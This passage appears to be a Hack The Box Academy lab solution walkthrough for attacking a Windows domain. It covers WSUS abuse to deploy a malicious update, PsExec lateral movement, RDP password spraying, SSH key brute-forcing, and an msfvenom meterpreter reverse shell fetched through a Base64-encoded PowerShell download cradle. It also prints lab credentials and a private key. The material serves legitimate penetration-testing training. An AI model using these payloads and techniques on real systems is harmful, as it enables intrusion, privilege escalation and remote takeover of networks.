Get-WinEvent -LogName Application | Where-Object { $_.Id -eq 364 } | fl
```

```
PS C:\Tools> Get-WinEvent -LogName Application | Where-Object { $_.Id -eq 364 } | fl

TimeCreated  : 11/25/2024 1:29:30 AM
ProviderName : Windows Server Update Services
Id           : 364
Message      : Content file download failed.
               Reason: HTTP status 404: The requested URL does not exist on the server.

               Source File: /Content/wuagent.exe
               Destination File: C:\WSUS\WsusContent\02\0098C79E1404B4399BF0E686D88DBF052269A302.exe
```

Students will copy `PsExec64.exe` from `C:\Tools\sysinternals` to the location found in the event, renaming `PsExec64.exe` to the unique name:

Code: powershell

```powershell
cp C:\Tools\sysinternals\PsExec64.exe C:\WSUS\WsusContent\02\
mv C:\WSUS\WsusContent\02\PsExec64.exe C:\WSUS\WsusContent\02\0098C79E1404B4399BF0E686D88DBF052269A302.exe
```

```
PS C:\Tools> cp C:\Tools\sysinternals\PsExec64.exe C:\WSUS\WsusContent\02\
PS C:\Tools> mv C:\WSUS\WsusContent\02\PsExec64.exe C:\WSUS\WsusContent\02\0098C79E1404B4399BF0E686D88DBF052269A302.exe
```

Students will return to the `Update Services` windows (`Windows Server Update Services`) and right-click on the update (`AcademyStudents`) and select `Approve`. In the `Approve Updates` window, they will click on `Approved for Install` across all groups:

![[HTB Solutions/CAPE/z. images/15061ba1d35a7a616f1c06ab4c80bb75_MD5.jpg]]

If needed students will right-click on the update and `Retry Download`:

![[HTB Solutions/CAPE/z. images/d15c86b8975659a582cc9fd844a58a43_MD5.jpg]]

After a few moments, students will return to the original RDP session on `SRV01`, open `PowerShell`, navigate to `C:\Tools\SysinternalSuite`, and use `PsExec` to establish a session on `DC01`:

Code: powershell

```powershell
cd C:\Tools\SysinternalsSuite
.\PsExec.exe \\dc01.inlanefreight.local -i -accepteula -s -u INLANEFREIGHT\filiplain -p Password1 cmd
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\filiplain> cd C:\Tools\SysinternalsSuite\
PS C:\Tools\SysinternalsSuite> .\PsExec.exe \\dc01.inlanefreight.local -i -accepteula -s -u INLANEFREIGHT\filiplain -p Password1 cmd

PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com

Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Having obtained a shell session on `DC01`, students can proceed to grab the flag located in `C:\WSUS`:

Code: powershell

```powershell
type C:\WSUS\flag.txt
```

```
C:\Windows\system32>type C:\WSUS\flag.txt
```

Answer: `WSUS_Rights_Are_Powerful`

# Skill Assessment

## Question 1

### "What's the content of the flag located at C:\\Users\\Dahlia\\Desktop\\flag.txt"

After spawning the target, students will start by enumerating the open ports using `Nmap`:

Code: shell

```shell
sudo nmap -sVC STMIP
```

```
┌─[us-academy-3]─[10.10.14.68]─[htb-ac-8414@htb-txbgom0c7p]─[~]
└──╼ [★]$ sudo nmap -sVC 10.129.230.162

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-16 00:05 CDT
Nmap scan report for 10.129.230.162
Host is up (0.078s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION

<SNIP>

8443/tcp open  ssl/http      Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server - SUPPORT.INLANEFREIGHT.LOCAL
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: 2024-07-16T05:06:55+00:00; 0s from scanner time.
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2024-06-28T09:39:50
|_Not valid after:  2024-09-26T09:39:50
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

<SNIP>
```

Students will notice in the result from `Nmap` the `commonName` of the subject in the SSL certificate is `PowerShellWebAccessTestWebSite`, and they will proceed to search for `PowerShell Web Access` in Google, where students will stumble upon the following [documentation](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831611\(v=ws.11\)#to-configure-the-windows-powershell-web-access-gateway-with-a-test-certificate-by-using-install-pswawebapplication) containing information about potential paths (endpoint URIs) such as `/pswa`. Subsequently, students will visit the path `https://STMIP:8443/pswa`, where they will ignore the certificate issue.

![[HTB Solutions/CAPE/z. images/1fac1188f885684362c6458a0984c7a0_MD5.jpg]]

Students will be presented with a login page and are going to submit the credentials `Dahlia:Mylittleangel1` and `support.inlanefreight.local` for the `Computer name`, which can be found in the results of the `Nmap` scan to sign in:

![[HTB Solutions/CAPE/z. images/563ab478522b46502cbdb90817f3e64a_MD5.jpg]]

Students will be presented with a `PowerShell` console, where they can execute commands.

![[HTB Solutions/CAPE/z. images/d9eb963962b1bda165b50e096538f093_MD5.jpg]]

Subsequently, students can grab the flag located in the `C:\Users\Dahlia\Desktop` directory:

Code: powershell

```powershell
type C:\Users\Dahlia\Desktop\flag.txt
```

```
Windows PowerShell

Copyright (C) 2016 Microsoft Corporation. All rights reserved.

 

PS C:\Users\Dahlia\Documents> type C:\Users\Dahlia\Desktop\flag.txt
```

Answer: `Getting_Started_PSWA`

# Skill Assessment

## Question 2

### "What's the content of the flag located at C:\\Users\\Arturo\\Desktop\\flag.txt"

Using the previously established `PowerShell` session and spawned target, students will query the files in the `C:\Users\Dahlia\Desktop` directory, finding a file named `notes.txt` which they will query the contents of:

Code: powershell

```powershell
dir C:\Users\Dahlia\Desktop
type C:\Users\Dahlia\Desktop\notes.txt
```

```
PS C:\Users\Dahlia\Documents> dir C:\Users\Dahlia\Desktop

    Directory: C:\Users\Dahlia\Desktop

Mode                LastWriteTime         Length Name                            
----                -------------         ------ ----                            
-a----        6/29/2024   5:26 AM             20 flag.txt
-a----         7/5/2024   6:15 AM           1260 notes.txt                     

PS C:\Users\Dahlia\Documents> type C:\Users\Dahlia\Desktop\notes.txt

Engineering Notes on Zero Trust Network Implementation
Zero Trust Networks

Block Non-required Communication
- Ensure that all non-essential network communications are blocked to minimize attack surfaces and potential entry points for unauthorized access.

Exclude Backup Server from In-bound Communication
- Configure the Backup Server to disallow all inbound communications. Only outbound communications are permitted to ensure data integrity and security.

Change Default Ports for Administration
- Implement a policy to change all default administration ports. Specifically, configure all machines to use PowerShell Remoting on a different, non-standard port.

- Pending implementation of SSH: Ensure SSH access is configured to allow only key-based authentication for enhanced security.

Testing IPv6
- Initiate testing procedures for IPv6 to ensure compatibility and security measures are in place for the transition from IPv4.

WSUS IPv6: dead:beef:df::3

Additional Information

Manager's Credentials for Testing:
- While the manager is on vacation, use the following credentials for testing purposes:
Password: Newyork0293!

Please ensure that these credentials are kept secure and only used for the intended testing purposes.
```

Going through the note, students will understand that the default ports have been changed, and testing can be done through IPv6 only, an IPv6 address for WSUS, and a password. Students will query some of the users who have logged in on the `support` machine by displaying the directories in `C:\Users`, stumbling upon `Arturo`, `Dahlia` and `rossy`:

Code: powershell

```powershell
dir C:\Users
```

```
PS C:\Users\Dahlia\Documents> dir C:\Users

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----                            
d-----        6/28/2024   9:27 AM                .NET v4.5                       
d-----        6/28/2024   9:27 AM                .NET v4.5 Classic               
d-----        6/28/2024   6:38 AM                Administrator                   
d-----        6/29/2024   5:07 AM                Administrator.INLANEFREIGHT     
d-----        6/29/2024   5:49 AM                Arturo                          
d-----        6/28/2024  10:02 AM                Dahlia                          
d-r---        10/6/2021   3:46 PM                Public                          
d-----        6/29/2024   6:03 AM                rossy
```

Subsequently, students will use `netstat` to display the ports in use on the machine based on the change in the note:

Code: powershell

```powershell
netstat -ano
```

```
PS C:\Users\Dahlia\Documents> netstat -ano

Active Connections
  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       2524
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       864
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8443           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:35985          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:43389          0.0.0.0:0              LISTENING       360
```

Observing the ports, students will notice that the default ports of `5985` and `3389` have been changed to `35985` and `43389`, respectively. Subsequently, they will utilize `netexec` and its `RDP` protocol to perform brute force against the previously found users and the password `Newyork0293!`:

Code: shell

```shell
netexec rdp STMIP -u Dahlia Arturo rossy -p 'Newyork0293!' --port 43389
```

```
┌─[us-academy-3]─[10.10.14.68]─[htb-ac-8414@htb-txbgom0c7p]─[~]
└──╼ [★]$ netexec rdp 10.129.230.162 -u Dahlia Arturo rossy -p 'Newyork0293!' --port 43389

RDP         10.129.230.162  43389  SUPPORT          [*] Windows 10 or Windows Server 2016 Build 17763 (name:SUPPORT) (domain:inlanefreight.local) (nla:True)
RDP         10.129.230.162  43389  SUPPORT          [-] inlanefreight.local\Dahlia:Newyork0293! (STATUS_LOGON_FAILURE)
RDP         10.129.230.162  43389  SUPPORT          [+] inlanefreight.local\Arturo:Newyork0293! (Pwn3d!)
```

Students will establish an RDP session using the credentials found through `NetExec`:

Code: shell

```shell
xfreerdp /v:STMIP:43389 /u:Arturo /p:'Newyork0293!' /dynamic-resolution /drive:.,academy
```

```
┌─[us-academy-3]─[10.10.14.68]─[htb-ac-8414@htb-txbgom0c7p]─[~]
└──╼ [★]$ xfreerdp /v:10.129.230.162:43389 /u:Arturo /p:'Newyork0293!' /dynamic-resolution /drive:.,academy

[01:20:32:636] [201217:201218] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[01:20:32:637] [201217:201218] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[01:20:32:637] [201217:201218] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[01:20:32:822] [201217:201218] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[01:20:32:822] [201217:201218] [WARN][com.freerdp.crypto] - CN = SUPPORT.inlanefreight.local
[01:20:32:823] [201217:201218] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:20:32:823] [201217:201218] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[01:20:32:823] [201217:201218] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:20:32:823] [201217:201218] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.230.162:43389) 
[01:20:32:823] [201217:201218] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[01:20:32:823] [201217:201218] [ERROR][com.freerdp.crypto] - Common Name (CN):
[01:20:32:823] [201217:201218] [ERROR][com.freerdp.crypto] - 	SUPPORT.inlanefreight.local
[01:20:32:823] [201217:201218] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.230.162:43389 (RDP-Server):
	Common Name: SUPPORT.inlanefreight.local
	Subject:     CN = SUPPORT.inlanefreight.local
	Issuer:      CN = SUPPORT.inlanefreight.local
	Thumbprint:  77:f4:da:d9:a6:f9:12:f6:09:47:db:31:11:7d:bf:7d:e8:e2:07:06:78:8c:3e:76:cc:75:af:ca:8e:38:fc:80
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, students will open `PowerShell` and utilize the `Invoke-Command` cmdlet to execute commands on the IPv6 host:

Code: powershell

```powershell
$user = "inlanefreight\arturo";$pass = "Newyork0293!";$securepass = ConvertTo-SecureString $pass -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential ($user, $securepass)

Invoke-Command -ComputerName dead:beef:df::3 -ScriptBlock {dir C:\users\arturo\desktop\} -Credential $cred -Port 35985
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Arturo> $user = "inlanefreight\arturo";$pass = "Newyork0293!";$securepass = ConvertTo-SecureString $pass -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential ($user, $securepass)

PS C:\Users\Arturo> Invoke-Command -ComputerName dead:beef:df::3 -ScriptBlock {dir C:\users\arturo\desktop\} -Credential $cred -Port 35985

    Directory: C:\users\arturo\desktop

Mode                LastWriteTime         Length Name                                PSComputerName
----                -------------         ------ ----                                --------------
-a----        6/29/2024   7:29 AM             58 flag.txt                            [dead:beef:df::3]
-a----        6/29/2024   6:03 AM           1675 id_rsa                              [dead:beef:df::3]
```

Having obtained command execution over the host, students can grab the flag located in the `C:\users\arturo\desktop` directory through the `Invoke-Command` cmdlet:

Code: powershell

```powershell
Invoke-Command -ComputerName dead:beef:df::3 -ScriptBlock {type C:\users\arturo\desktop\flag.txt} -Credential $cred -Port 35985
```

```
PS C:\Users\Arturo> Invoke-Command -ComputerName dead:beef:df::3 -ScriptBlock {type C:\users\arturo\desktop\flag.txt} -Credential $cred -Port 35985
```

Answer: `IPv6Access_Non_DefaultPort`

# Skill Assessment

## Question 3

### "What's the username of the account member of WSUS Administrator?"

Students will reuse the previously established RDP session and spawned target to enumerate the `WSUS Administrators` group through the `Invoke-Command` cmdlet:

Code: powershell

```powershell
Invoke-Command -ComputerName dead:beef:df::3 -ScriptBlock {net localgroup "WSUS Administrators"} -Credential $cred -Port 35985
```

```
PS C:\Users\Arturo> Invoke-Command -ComputerName dead:beef:df::3 -ScriptBlock {net localgroup "WSUS Administrators"} -Credential $cred -Port 35985
Alias name     WSUS Administrators
Comment        Members of this group can administer the Windows Server Update Services role.

Members

-------------------------------------------------------------------------------
INLANEFREIGHT\{hidden}
The command completed successfully.
```

Answer: `Rossy`

# Skill Assessment

## Question 4

### "What's the password of the account member of WSUS Administrator?"

Students will reuse the previously established RDP session and spawned target to obtain the private key located in the `C:\users\arturo\desktop` directory:

Code: powershell

```powershell
Invoke-Command -ComputerName dead:beef:df::3 -ScriptBlock {type C:\users\arturo\desktop\id_rsa} -Credential $cred -Port 35985
```

```
PS C:\Users\Arturo> Invoke-Command -ComputerName dead:beef:df::3 -ScriptBlock {type C:\users\arturo\desktop\id_rsa} -Credential $cred -Port 35985

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA1uyopXqVHVAetSGYf67Z6BBv9bfOxVCRx3jzrpL6SWnWnvIE
nJruxnMByrTFh5cYN+QrCctE0XTgluZYp4XZBK2qDngnZxIFk3Ibd5qQXtDR0WKZ
aGd+hpC4p7gag+UmzYv5nC1GPhbUJEgTCsz4OksqYZPG2i7f6fK7FldAUo4AtL1S
8eS0xNxNmehRYdY6z+e1P6iqddjGKHFgbDru9ehHWWmXN+guBsCFPltZyFEB/egB
sfsd4rSehgnrcK8ShjQZNhZYl2r850RU6ysQPoCZm1xYXfp8BMzmQGGrcmjf1P7j
/ke5It2DaZ/tL5CjT0pj+EIA+Rwpy/ZHz61zZwIDAQABAoIBAFJyxRt+E/gDxVPt
CGhq9jL9I0Ya9hphlxrzfl/JCHTjQi8FXtmI4fKFKfnOMTybrPG7+Pqv3L2RXZrl
0LqrMR6HVIZqd4slsbfnfTv7skh9SRBPB9SyZypOGFhW2u0gGiud9+p+v8SP01/7
ujpZeRw7u41lOFJ4yvMfZ7/hRs6j8Q1/zFvgKXu6qUc5Ze1MDmTqDECV++WXcaBQ
GTDfSsBiXwbYaOhUF2iMxQ9GzgUZLsY4+kh71c5tnsQ3dwyfWpyXseUWxkl7LE6B
n6jMQUX46xSQgosfnPtv6veAkWdoKYIJRqeRCuBGHpdw7CPslnJrd41Y8/FCZSNi
Jo6sBgkCgYEA7Muq8rHCKgUJ3fyYK2/sV46g/604aigyOyejYfzAGPxyoDG6gCpc
BTAzHKdmIn002UCIgFeJCl7rVmpPrTJ4st/QDjh0yxmEVYdpU86GRuvfxjYNJJQf
ZrnMCqU6GtQOfzOmSud4gJWc1aycRHRkCI6CMRJ3ZkQkGqzbXvzZYPsCgYEA6Frn
fQo7uEbUzFvIBq1qZ7Mxvd1HKNtwe0Nr/eAvj1dcq8Fdct8vryEl6B2frevcNCZ4
S3EsActgJQfwv2sQANnMqfP7Og2fj67P1Rad0iDdMpuoblopXZ6IMLUs/kEqpHbq
4ksPLu0PfPAQgOs6gpb5KCrF8BCzSC08TxQnY4UCgYA+Qw8f4T18bva5N8GLKlKq
cwZCM/mxcABFLZb4HM0lxLsfA/RV3s1zT8kgr6NbTjCnLyC1Hk8aOvsGLc3lbG/w
GIlMM+wBuyPgmUpIjvUfkMW2CGBMTeYzzIaqBefRRhDJwXroFxTIOo6SYGB2X2Qu
G8p/vKtIaIJVwT2tLC68IQKBgDr1xkPuctUB9EGfEJTRMGz8BaU+Hy548IP2ydJ0
Lt1at8NFn+bkR39TFAFgcwJ5FTmOgXvzTc1uxAjhiO+pxTfSDKMbrCZBCro1C7vw
rz+A42BSK11FN7Xv4nMppi8mbiGpo1Sk40dvFD0J1cZA6mn00Wil4fBW7IdmIyWV
4aDZAoGBAMUM2Vlgi+63iedYzMMNjIPtuWi2CiRl/PIi9+KwDkc1Vta1FhqvyM+I
JeKFcH0U95Kty4stCb6/imTFW3XvhY45obSmPROSiJMuyO9x5RR6POH5OjEDdQq6
Luqx6JRLdWISIz1wzpGIz4vBUF4jsrA6HOwBpt6vcAlNCZ3cW1TX
-----END RSA PRIVATE KEY-----
```

Subsequently, students will save the private key in a file and reuse the bash script from the `Secure Shell (SSH)` section exercise to run it against the users they previously have found.

Code: bash

```bash
while read -r user; do
		echo "Trying user: $user"
		ssh -o BatchMode=yes -o StrictHostKeyChecking=no -i id_rsa $user@STMIP "exit" 2>/dev/null
		if [ $? -eq 0 ]; then
				echo "Login successful for user: $user"
				break
		fi
done < users.txt
```

```
┌─[us-academy-3]─[10.10.14.68]─[htb-ac-8414@htb-txbgom0c7p]─[~]
└──╼ [★]$ bash ssh-brute.sh 

Trying user: Arturo
Trying user: Dahlia
Trying user: rossy
Login successful for user: rossy
```

Students will proceed to authenticate using the private key as `rossy` to the target machine through SSH:

Code: shell

```shell
chmod 600 id_rsa
ssh -i id_rsa rossy@STMIP
```

```
┌─[us-academy-3]─[10.10.14.68]─[htb-ac-8414@htb-txbgom0c7p]─[~]
└──╼ [★]$ chmod 600 id_rsa

┌─[us-academy-3]─[10.10.14.68]─[htb-ac-8414@htb-txbgom0c7p]─[~]
└──╼ [★]$ ssh -i id_rsa rossy@10.129.230.162

Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

inlanefreight\rossy@SUPPORT C:\Users\rossy>
```

Having obtained an SSH session on the target machine, students can proceed to query the files in the `C:\Users\rossy\Desktop` directory and query the `newcreds.txt` file:

Code: shell

```shell
dir C:\Users\rossy\Desktop
type C:\Users\rossy\Desktop\newcreds.txt
```

```
inlanefreight\rossy@SUPPORT C:\Users\rossy>dir C:\Users\rossy\Desktop

 Volume in drive C has no label.
 Volume Serial Number is 8DE5-3443

 Directory of C:\Users\rossy\Desktop

06/29/2024  06:01 AM    <DIR>          .
06/29/2024  06:01 AM    <DIR>          ..
06/29/2024  06:02 AM                17 newcreds.txt 
               1 File(s)             17 bytes       
               2 Dir(s)  12,257,247,232 bytes free  

inlanefreight\rossy@SUPPORT C:\Users\rossy>type C:\Users\rossy\Desktop\newcreds.txt 

rossy:{hidden}
```

Answer: `Themother92`

# Skill Assessment

## Question 5

### "What is the password for VNC?"

Students will download [PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) and [Invoke-SharpWSUS](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpWSUS.ps1):

Code: shell

```shell
wget -q https://download.sysinternals.com/files/PSTools.zip; unzip PSTools.zip PsExec64.exe
wget -q https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWSUS.ps1
```

```
┌─[us-academy-3]─[10.10.14.68]─[htb-ac-8414@htb-txbgom0c7p]─[~]
└──╼ [★]$ wget -q https://download.sysinternals.com/files/PSTools.zip; unzip PSTools.zip PsExec64.exe

Archive:  PSTools.zip
  inflating: PsExec64.exe

┌─[us-academy-3]─[10.10.14.68]─[htb-ac-8414@htb-txbgom0c7p]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWSUS.ps1
```

Students will establish an RDP session to `dead:beef:df::3` on port `43389` using the credentials `rossy:Themother92` within the previously established RDP session.

![[HTB Solutions/CAPE/z. images/5fd5d37b105526ed4b050fb1363ecdd9_MD5.jpg]]

![[HTB Solutions/CAPE/z. images/a4d09e9d9215fda2c4d4eff138525539_MD5.jpg]]

![[HTB Solutions/CAPE/z. images/351dc7437e4d4b976fcbd05743fa8dd3_MD5.jpg]]

Students will return to their workstations', open a new terminal tab, and start a Python HTTP Server:

Code: shell

```shell
python3 -m http.server
```

```
┌─[us-academy-3]─[10.10.14.68]─[htb-ac-8414@htb-crjlj1gunc]─[~]
└──╼ [★]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Subsequently, students will use `msfvenom` and `msfconsole` to handle the `PowerShell` reverse shell payload:

Code: shell

```shell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=PWNIP LPORT=PWNPO -f psh-reflection -o s
msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_https; set LHOST PWNIP; set LPORT PWNPO; set EXITONSESSION false; set EXITFUNC thread; run -j"
```

```
┌─[us-academy-3]─[10.10.14.68]─[htb-ac-8414@htb-crjlj1gunc]─[~]
└──╼ [★]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.68 LPORT=8888 -f psh-reflection -o s

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 710 bytes
Final size of psh-reflection file: 3474 bytes
Saved as: s

┌─[us-academy-3]─[10.10.14.68]─[htb-ac-8414@htb-crjlj1gunc]─[~]
└──╼ [★]$ msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_https; set LHOST 10.10.14.68; set LPORT 8888; set EXITONSESSION false; set EXITFUNC thread; run -j"

<SNIP>

[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter/reverse_https
LHOST => 10.10.14.68
LPORT => 8888
EXITONSESSION => false
EXITFUNC => thread
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[msf](Jobs:1 Agents:0) exploit(multi/handler) >> 
[*] Started HTTPS reverse handler on https://10.10.14.68:8888
```

Students will return to the RDP session they have established on the `WSUS` host, and they will open `PowerShell`, and download the `PsExec64.exe` executable and the `Invoke-SharpWSUS` module:

```powershell
iwr -uri http://PWNIP:8000/PsExec64.exe -o PsExec64.exe
iwr -uri http://PWNIP:8000/Invoke-SharpWSUS.ps1 -o Invoke-SharpWSUS.ps1
```
```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\rossy> iwr -uri http://10.10.14.68:8000/PsExec64.exe -o PsExec64.exe
PS C:\Users\rossy> iwr -uri http://10.10.14.68:8000/Invoke-SharpWSUS.ps1 -o Invoke-SharpWSUS.ps1
```

Subsequently, students will proceed to create a variable to download the `PowerShell` reverse shell payload (`/s`) and encode it in Base64 which will be further used:

```powershell
$payload = 'IEX(New-Object Net.WebClient).downloadString("http://PWNIP:PWNPO/s")'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
```
```
PS C:\Users\rossy> $payload = 'IEX(New-Object Net.WebClient).downloadString("http://10.10.14.68:8000/s")'

PS C:\Users\rossy> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))

SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYAOAA6ADgAMAAwADAALwBzACIAKQA=
```

They will import `Invoke-SharpWSUS.ps1` and will proceed to generate a malicious payload using `PsExec64.exe` to execute the Base64 encoded blob:

```powershell
Import-Module .\Invoke-SharpWSUS.ps1
Invoke-SharpWSUS create /payload:C:\Users\rossy\PsExec64.exe /args:"-accepteula -s -d cmd /c powershell.exe -exec bypass -enc <Base64_Payload>" /title:"Payload"
```
```
PS C:\Users\rossy> Import-Module .\Invoke-SharpWSUS.ps1
PS C:\Users\rossy> Invoke-SharpWSUS create /payload:C:\Users\rossy\PsExec64.exe /args:"-accepteula -s -d cmd /c powershell.exe -exec bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYAOAA6ADgAMAAwADAALwBzACIAKQA=" /title:"Payload"

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _\` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Create Update
[*] Creating patch to use the following:
[*] Payload: PsExec64.exe
[*] Payload Path: C:\Users\rossy\PsExec64.exe
[*] Arguments: -accepteula -s -d cmd /c powershell.exe -exec bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYAOAA6ADgAMAAwADAALwBzACIAKQA=
[*] Arguments (HTML Encoded): -accepteula -s -d cmd /c powershell.exe -exec bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYAOAA6ADgAMAAwADAALwBzACIAKQA=

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
WSUS, 8530, C:\WSUS\WsusContent

ImportUpdate
Update Revision ID: 102290
PrepareXMLtoClient
InjectURL2Download
DeploymentRevision
PrepareBundle
PrepareBundle Revision ID: 102291
PrepareXMLBundletoClient
DeploymentRevision

[*] Update created - When ready to deploy use the following command:
[*] SharpWSUS.exe approve /updateid:d69e19c6-4de2-449a-906a-dca73ce4d1e9 /computername:Target.FQDN /groupname:"Group Name"

[*] To check on the update status use the following command:
[*] SharpWSUS.exe check /updateid:d69e19c6-4de2-449a-906a-dca73ce4d1e9 /computername:Target.FQDN

[*] To delete the update use the following command:
[*] SharpWSUS.exe delete /updateid:d69e19c6-4de2-449a-906a-dca73ce4d1e9 /computername:Target.FQDN /groupname:"Group Name"

[*] Create complete
```

Students will then proceed to utilize `Windows Server Update Services` to approve the malicious update they created.

![[HTB Solutions/CAPE/z. images/e1ae0752a3465d7fcd38919fd5784db1_MD5.jpg]]

They will navigate to `WSUS` -> `Updates` -> `All Updates`:

![[HTB Solutions/CAPE/z. images/faa5ba17bda5707647fd509b43dc6bbb_MD5.jpg]]

Students will change the `Status` to `Any` and will click on `Refresh`:

![[HTB Solutions/CAPE/z. images/27d5255f92ef75c4e82ee74c8e664d05_MD5.jpg]]

They will scroll to the bottom where they will see the malicious payload they have created. Subsequently, students will right-click on it and select `Approve...`:

![[HTB Solutions/CAPE/z. images/00b5a6a64132e8f5d02089d5de410818_MD5.jpg]]

A new window will appear, where the students will click on the icon next to `All Computers`, selecting the `Approved for Install` option, and on the `Unassigned Computers` selecting `Approved for Install`, and will click `OK`:

![[HTB Solutions/CAPE/z. images/c7607a1c4683eaba0844cf3fdd419764_MD5.jpg]]

After a few moments, students will open `Event Viewer`, navigate to `Custom Views` -> `Server Roles` -> `Windows Server Update Services`, and go over the log with event ID `364`. Students will come to know that there is a 404 error, and they will see the expected `filename` and `destination` of the `C:\WSUS\WsusContent\02` directory:

![[HTB Solutions/CAPE/z. images/b8efbd9d4c6cafc7c1b7ac4f2858bf19_MD5.jpg]]

Students will copy the destination and the filename from the log, use the previously spawned `PowerShell` terminal, and copy `PsExec64.exe` to the expected directory and filename:

```powershell
copy .\PsExec64.exe C:\WSUS\WsusContent\02\<filename>.exe
```
```
PS C:\Users\rossy> copy .\PsExec64.exe C:\WSUS\WsusContent\02\0098C79E1404B4399BF0E686D88DBF052269A302.exe
```

Students will return to `Update Services` and will change the `Approval` from `Unapproved` to `Approved` and click `Refresh`.

![[HTB Solutions/CAPE/z. images/a8a73b05867345f8016ac50ba0e5a03f_MD5.jpg]]

They will right-click on their update and `Retry Download`:

![[HTB Solutions/CAPE/z. images/a7889a422a315d079c22b51bb3460855_MD5.jpg]]

